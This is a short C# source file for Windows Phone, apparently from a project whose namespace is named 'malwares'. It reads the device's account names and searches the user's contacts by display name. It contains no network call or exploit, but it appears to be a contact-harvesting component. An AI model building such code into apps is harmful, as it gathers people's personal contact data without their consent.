using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Phone.Controls;
using Microsoft.Phone.UserData;

namespace malwares
{
    public class GetterContact
    {
       
        IEnumerable<Contact> contacts;
 
        List<string> accs = new List<string>();

        public GetterContact()
        {
            intiliaze();
            Search("mo");
        }

        public void intiliaze()
        {
            Contacts cons = new Contacts();

            IEnumerable<Account> accss = cons.Accounts;
            for (int i = 0; i < accss.Count(); i++)
            {
                accs.Add(accss.ElementAt<Account>(i).Name);
                
            }
        }

        public List<string> getContacts()
        {
            return accs;
        }

        public IEnumerable<Contact> Contacts_
        {
            get { return contacts; }
        }

        public void Search(string what)
        {
            Contacts cons = new Contacts();

            cons.SearchCompleted += new EventHandler<ContactsSearchEventArgs>(Contacts_SearchCompleted);

            cons.SearchAsync(what, FilterKind.DisplayName, "Contacts Test #1");
        }


        void Contacts_SearchCompleted(object sender, ContactsSearchEventArgs e)
        {
            //MessageBox.Show(e.State.ToString());

            try
            {
                //Bind the results to the list box that displays them in the UI.
                 contacts = e.Results;
            }
            catch (System.Exception)
            {
                //That's okay, no results.
            }
        }



    }
}
